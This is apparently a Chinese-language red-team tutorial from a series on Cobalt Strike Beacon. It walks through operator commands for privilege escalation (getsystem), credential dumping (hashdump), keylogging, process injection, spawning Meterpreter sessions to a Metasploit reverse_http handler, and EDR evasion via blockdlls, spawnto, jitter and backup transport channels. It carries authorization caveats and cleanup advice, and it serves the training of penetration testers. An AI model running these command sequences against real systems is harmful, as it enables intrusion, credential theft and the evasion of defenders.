---
title: CS Beacon 常用命令：日常操作与派生到 MSF
description: 系统过一遍 Cobalt Strike Beacon 的高频命令——shell/powershell 执行系统命令、getuid/getsystem 看权限与提权、ps/screenshot/keylogger 信息收集、sleep 调心跳、进程注入，以及如何用 foreign listener 把 Beacon 派生到 Metasploit 联动。
category: security
subcategory: cs
tags: ['Cobalt Strike', 'Beacon', 'getsystem', '派生', 'spawn']
pubDate: 2026-07-19
order: 3
---

上篇你让 Beacon 上线了，也下了第一条 `shell whoami`。这一篇把 Beacon 的**日常命令**系统过一遍——这些是你在 CS 里 80% 时间会用到的操作。最后再讲一个实战高频动作：**把 Beacon 派生（spawn）成 Metasploit 会话**，让两个框架联手。

> 本文所有操作仅用于你对**自有或已授权**的目标。键盘记录、凭据抓取等动作需明确授权并在报告中透明记录。

## 执行系统命令：shell 与 powershell

Beacon 本身有一套指令，但要跑系统原生命令，靠这两个前缀：

- **`shell <命令>`**：用 `cmd.exe` 执行。比如 `shell whoami /priv`、`shell net user`。
- **`powershell <脚本或命令>`**：用 PowerShell 执行，适合更现代的 Windows 操作（如 `powershell Get-Process`）。

```text
beacon> shell ipconfig /all
beacon> powershell "(Get-WmiObject Win32_ComputerSystem).Name"
```

注意：Beacon 是"异步"的——你下 `shell` 命令后，要等它下次 checkin 才把结果带回。所以下完命令稍等一个 sleep 周期，结果会出现在 Beacon 控制台里。着急可以临时 `sleep 5`。

## 看权限与提权：getuid / getsystem

- **`getuid`**：显示 Beacon 当前以哪个用户运行（如 `BUILTIN\admin` 或 `NT AUTHORITY\SYSTEM`）。
- **`getsystem`**：尝试提权到 `SYSTEM`（利用令牌提升等技术）。成功的话 `getuid` 会变成 SYSTEM，后续抓哈希、装驱动等高危操作才有权限。

```text
beacon> getuid
[*] You are SYSTEM    # 已经是最高权限
beacon> getsystem     # 若不是，尝试提权
```

提权不总是成功（取决于补丁、配置），失败时要换别的提权手法（见"内网渗透·权限提升"）。

## 进程与信息收集

- **`ps`**：列出进程，找可注入的稳定进程（如 `explorer.exe`）。
- **`screenshot`**：截当前桌面，直观看用户在干嘛。
- **`keylogger`**：开始键盘记录（合规门槛高，仅明确授权用）。
- **`hashdump`**：导出本地密码哈希（需够权限，类似 MSF）。
- **`net <命令>`**：如 `shell net view` 看内网共享机器，`shell net user /domain` 看域用户。

```text
beacon> screenshot
beacon> hashdump
beacon> shell net view
```

## 进程注入与迁移：inject / spawn

Beacon 默认在某个进程里。为了稳定/隐蔽，常把它注入到别的进程：

- **`inject <pid> <listener>`**：把一个新的 Beacon 注入到指定 PID 的进程（同会话派生）。
- **`spawn <listener>`**：开一个新进程（默认 `explorer.exe`）并在里面注入一个 Beacon，等于"生个孩子"继续控制。

```text
beacon> ps                       # 找 explorer.exe 的 PID，比如 2000
beacon> inject 2000 http-listener-1   # 把 Beacon 注入 explorer.exe
beacon> spawn http-listener-1         # 另起进程注入一个新 Beacon
```

`spawn` 在"把权限从脆弱进程迁到稳定进程"时特别常用，和 MSF 的 `migrate` 一个道理。

## 派生到 Metasploit：让两个框架联手

CS 强在驻留协作，MSF 强在利用模块。实战常把初始 Beacon **派生成 MSF 会话**，借 MSF 的 exploit/post 模块继续打。做法用 **foreign listener**：

```text
# 1) 在 MSF 里起一个 handler 接 reverse_http
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set PAYLOAD windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST <Team Server IP 或你的 IP>
msf6 exploit(multi/handler) > set LPORT 8888
msf6 exploit(multi/handler) > run

# 2) 在 CS 里建一个 foreign listener：
#    Cobalt Strike → Listeners → Add → 类型 windows/foreign/reverse_http
#    Host/Port 填上面 MSF handler 的 LHOST/LPORT

# 3) 在 Beacon 里派生：
beacon> spawn foreign-listener-name    # 生成一个连到 MSF 的 Meterpreter 会话
```

`spawn` 选 foreign listener 后，CS 会生成一个 Meterpreter 会话回连到 MSF 的 handler——于是你在 MSF 里也拿到了这台机器，可以混用两边能力。这就是"CS 管驻留、MSF 管利用"的典型配合。

## sleep 与隐蔽性的日常权衡

前面讲过 sleep。日常操作建议：干活时 `sleep 5~10` 求实时，干完 `sleep 60~300` 求隐蔽。还有 `jitter`（抖动）让回连时间随机化，更不像机器心跳：

```text
beacon> sleep 60 20     # 基础 60 秒，附加 20% 抖动（实际 48~72 秒随机）
```

## 常见新手坑

- **下 shell 命令没结果**：Beacon 异步，等一个 sleep 周期；或临时 `sleep 5` 再下。
- **getsystem 失败就卡住**：提权受补丁/配置限制，失败要换手法（令牌、服务、内核漏洞）。
- **spawn 选错 listener**：spawn 到 http listener 是再生一个 CS Beacon；要进 MSF 必须选 foreign listener。
- **键盘记录滥用**：`keylogger` 合规门槛高，没明确授权别用，用了报告要透明。

## 进阶：Beacon 的隐蔽运行技巧

Beacon 上线后，怎么"待得久"是实战关键。几个技巧：

- **注入到稳定进程**：`spawn` 或 `inject` 到 `explorer.exe`、`svchost.exe` 这类常驻进程，避免随临时进程退出而掉线。
- **用 `sleep` + `jitter` 打散心跳**：`sleep 60 20` 让回连时间随机，不像机器心跳那么规律。
- **`blockdlls` 干扰 EDR**：Beacon 可选项里开启后，尝试阻止第三方 DLL（含部分 EDR 的注入 DLL）加载进 Beacon 进程，增加 EDR 监控难度。
- **`spawnto` 改子进程**：Beacon 起子进程（如 `shell` 起的 cmd）默认用某个系统程序，可改 `spawnto` 指定更隐蔽的二进制，避免 `cmd.exe` 被重点监控。

这些不是"免杀万能药"，而是**提高生存率的叠加手段**，配合免杀（内网篇）才完整。

## 实战：一次典型 Beacon 操作会话

给一段"靶机上线后你通常会敲的命令流水"，感受真实节奏：

```text
beacon> getuid                 # 当前是谁
beacon> getsystem              # 尝试提权到 SYSTEM
beacon> ps                     # 找 explorer.exe 的 PID
beacon> inject <pid> http-1    # 把 Beacon 注入 explorer，更稳
beacon> shell ipconfig /all    # 看内网 IP/网关/DNS（常指向域控）
beacon> shell net view         # 看网络邻居共享机器
beacon> hashdump               # 抓本地哈希，备横向
beacon> screenshot             # 截桌面
beacon> sleep 60               # 干完调回长心跳，求隐蔽
beacon> background             # 挂起，回控制台干别的
```

这段流水体现 CS 的日常：**确认身份→提权→稳会话→收内网情报→抓凭据→调隐蔽→挂起**。和 MSF Meterpreter 的操作高度相似，因为底层都是"控制一台机器"。区别在于 CS 用 Beacon 指令集（`shell`/`powershell` 前缀），且心跳异步——下完命令稍等一个 sleep 周期看结果。

## Beacon 命令速查表

把常用 Beacon 命令收成一张表，随用随查：

| 命令 | 作用 |
|------|------|
| `getuid` | 看当前权限 |
| `getsystem` | 尝试提权到 SYSTEM |
| `shell <cmd>` | 用 cmd 执行系统命令 |
| `powershell <cmd>` | 用 PowerShell 执行 |
| `ps` | 进程列表 |
| `inject <pid> <listener>` | 注入指定进程 |
| `spawn <listener>` | 另起进程注入新 Beacon |
| `screenshot` | 截桌面 |
| `hashdump` | 抓本地哈希 |
| `keylogger` | 键盘记录（合规门槛高） |
| `sleep <秒> [抖动]` | 调心跳间隔 |
| `net <cmd>` | 网络相关（view/user） |
| `background` | 挂起回控制台 |

注意 Beacon 是**异步**的：下 `shell` 命令后，结果要等下一次 checkin（一个 sleep 周期）才回显。着急就临时 `sleep 5`，看完再调回去。

## Beacon 的"通道"进阶

前面提过 `transport` 加备用通道，这里把 Beacon 的"连接管理"讲透一点。Beacon 支持同时配多个回连通道（transport），主用 TCP、备用 HTTPS，一条被掐自动切另一条，提高存活：

```text
beacon> transport list                       # 看当前所有通道
beacon> transport add -t reverse_https -l 1.2.3.4 -p 8443 -y 30   # 加 HTTPS 备用
beacon> transport prev / next                # 手动切换主用通道
```

还有几个和"连接行为"相关的命令：

- **`checkin`**：立即触发一次回连（不等 sleep 周期），急着收结果时用。
- **`mode`**：在 `dns`/`tcp`/`http` 等传输模式间切换（需对应 listener）。
- **`spawnto`**：改 Beacon 起子进程时用的程序（默认 `cmd.exe` 易被监控，换成更隐蔽的系统程序可降低特征）。

这些都属于"让 Beacon 更稳、更隐蔽"的进阶技巧，配合 `sleep`/`jitter` 和免杀（内网篇），构成 CS 的生存能力组合拳。

## 速记：Beacon 日常五命令

Beacon 上线后，这五个命令覆盖 80% 日常：

1. **`getuid`**：看当前权限。
2. **`getsystem`**：尝试提权到 SYSTEM。
3. **`shell <cmd>`**：用 cmd 跑系统命令（结果等 checkin 回显）。
4. **`ps`**：看进程，找稳定进程准备迁移。
5. **`sleep <秒>`**：调心跳，干活调小、干完调大。

配合 `inject`/`spawn` 做进程迁移、`hashdump` 抓凭据、`screenshot` 截屏，基本就能在目标上"安家"。其余命令用到再查前面的速查表即可。

## Beacon 的退出与清理

练习或测试结束，要把 Beacon 干净撤掉，既是职业素养也避免遗留风险：

- **结束 Beacon**：在 Beacon 交互里 `exit` 让它自行退出；或在 Beacon 列表右键 `Kill` 强制结束进程。退出前可先 `sleep 0` 让最后一次 checkin 完成，避免卡在睡眠里。
- **清控制台**：`clear` 清掉当前 Beacon 的控制台输出（仅本地显示，不影响目标）。
- **删目标上的痕迹**：Beacon 木马文件、可能落地的临时文件，要从目标机器删掉；若用了 `persistence` 后门，必须一并移除（见 CS 投递篇的合规要求）。
- **关 listener**：不再需要时可在 Listeners 面板移除对应 listener，释放 Team Server 端口。

清理和"部署"一样重要：红队的价值在验证防御，留下没清理的后门既不安全也不专业。授权测试结束，目标应恢复到"除漏洞证据外无残留"的状态。

## 延伸

Beacon 的能力远不止本文这些基础命令——它还能做键盘记录、截屏定时、下载执行、端口扫描、甚至作为 SOCKS 跳板（配合 `rportfwd`）。这些进阶用法在真实演练里按需取用，入门阶段先把 `getuid`/`getsystem`/`shell`/`ps`/`sleep` 和 `inject`/`spawn` 练熟，就足以应付大多数控制场景。后续配合内网篇的横向与免杀，Beacon 的价值会进一步放大。

## 常见误区

- **"Beacon 注入 explorer 就绝对安全"**：更稳定但不等于不被检测，EDR 仍可能抓行为。
- **"派生到 MSF 必须换机器"**：派生是在同一目标上新起一个 Meterpreter 会话，不是换机器。
- **"shell 命令立刻有结果"**：Beacon 异步，结果等 checkin，下完稍等。
- **"keylogger 是常规操作"**：隐私类命令合规门槛高，没明确授权别用。

## 自测题

1. `getsystem` 失败时，下一步该考虑什么（而非卡住）？
2. `inject` 和 `spawn` 的区别？各自什么场景用？
3. 怎么把 Beacon 派生成 MSF 的 Meterpreter 会话？关键在哪类 listener？
4. `sleep 60 20` 的 `20` 是什么含义，为什么有用？

## 这一篇你该记住的

- `shell <cmd>` 跑 cmd、`powershell <cmd>` 跑 PowerShell；Beacon 异步，结果等 checkin 才回。
- `getuid` 看权限、`getsystem` 尝试提权到 SYSTEM；`ps`/`screenshot`/`hashdump`/`net` 做信息收集。
- `inject <pid>` 注入指定进程、`spawn <listener>` 另起进程注入 Beacon（迁稳用）。
- 派生到 MSF：建 **foreign listener** 指向 MSF 的 `multi/handler`，再 `spawn` 它，拿到 Meterpreter 会话。
- `sleep 60 20` 用基础+抖动平衡实时与隐蔽；干活调小、干完调大。

下一篇是 CS 基础收尾——**投递与钓鱼**。Beacon 木马生成好了，怎么让它到目标机器上运行？这一篇讲钓鱼邮件、恶意文档、网页投递这些"让目标主动运行"的手法，以及它们极高的合规要求。